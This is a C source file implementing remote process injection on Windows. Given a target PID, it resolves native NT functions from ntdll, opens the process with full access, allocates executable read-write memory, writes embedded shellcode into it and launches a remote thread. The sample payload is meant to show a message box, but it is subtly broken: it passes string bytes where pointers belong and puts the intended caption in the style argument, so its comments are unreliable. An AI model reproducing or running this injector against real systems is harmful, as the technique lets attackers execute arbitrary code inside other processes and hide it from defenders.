#include "definitions.h"

// --------------------------------------------------------------- Get module ----------------------------------------------------------------------//

HMODULE getMod(LPCWSTR modName) {
    info("trying to get a handle to %S", modName);
    HMODULE hModule = GetModuleHandleW(modName);
    if (!hModule) {
        warn("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }
    okay("got a handle to the module!");
    info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
    return hModule;
}

int main(int argc, char* argv[])
{
    DWORD     PID = 0;
    HANDLE    hProcess = NULL;
    HANDLE    hThread = NULL;
    PVOID     rBuffer = NULL;
    HMODULE   hNTDLL = NULL;
    NTSTATUS  STATUS = 0;

    // Basic x64 MessageBoxA shellcode (will show "Hello" with title "World")
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
        0x48, 0x31, 0xC9,                               // xor rcx, rcx
        0x48, 0x31, 0xD2,                               // xor rdx, rdx
        0x49, 0xB8, 'H', 'e', 'l', 'l', 'o', 0x00, 0x00, 0x00, // mov r8, "Hello"
        0x49, 0xB9, 'W', 'o', 'r', 'l', 'd', 0x00, 0x00, 0x00, // mov r9, "World"
        0x48, 0xB8,                                      // mov rax, MessageBoxA address (patched below)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0,                                      // call rax
        0x48, 0x83, 0xC4, 0x28,                          // add rsp, 0x28
        0xC3                                             // ret
    };

    SIZE_T szShellcode = sizeof(shellcode);

    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    // Patch MessageBoxA address into shellcode
    FARPROC msgBox = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
    if (!msgBox) {
        warn("failed to get address of MessageBoxA");
        return EXIT_FAILURE;
    }

    *(uintptr_t*)(shellcode + 32) = (uintptr_t)msgBox;

    PID = atoi(argv[1]);
    hNTDLL = getMod(L"NTDLL");

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)PID, NULL };

    info("starting function prototypes...");
    NtOpenProcess                bichOpen      = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx             bichThread    = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose                      bichClose     = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    NtAllocateVirtualMemory      bichAlloc     = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory         bichWrite     = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    okay("finished, beginning injection!");

    //--------------------------------------------------- injection ------------------------------------------------------------------------------------//

    STATUS = bichOpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
        return EXIT_FAILURE;
    }

    okay("got a handle on the process! (%ld)", PID);
    info("\\__[ hProcess\n\t\\_0x%p]\n", hProcess);

    //------------------------------------------------- allocating buffer in memory ----------------------------------------------------------------//

    info("allocating [RWX] buffer in process memory...");
    PVOID baseAddress = NULL;
    SIZE_T regionSize = szShellcode;
    STATUS = bichAlloc(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    rBuffer = baseAddress;
    okay("allocated [RWX] buffer in the process memory at 0x%p", rBuffer);

    //------------------------------------------------- write shellcode to the buffer ----------------------------------------------------------------//

    info("writing shellcode to the allocated buffer...");
    STATUS = bichWrite(hProcess, rBuffer, (PVOID)shellcode, szShellcode, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed, error: 0x%lx", STATUS);
        goto CLEANUP;
    }

    //------------------------------------------------- create remote thread --------------------------------------------------------------------------//

    STATUS = bichThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed to create remote thread, error: 0x%lx", STATUS);
        goto CLEANUP;
    }

    okay("thread created, started routine! waiting for thread to finish...");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished execution! beginning cleanup...");

CLEANUP:
    if (hThread) {
        CloseHandle(hThread);
        info("closed handle on thread");
    }
    if (hProcess) {
        CloseHandle(hProcess);
        info("closed handle on process");
    }

    okay("finished with cleanup, love yall ^_^");
    return EXIT_SUCCESS;
}
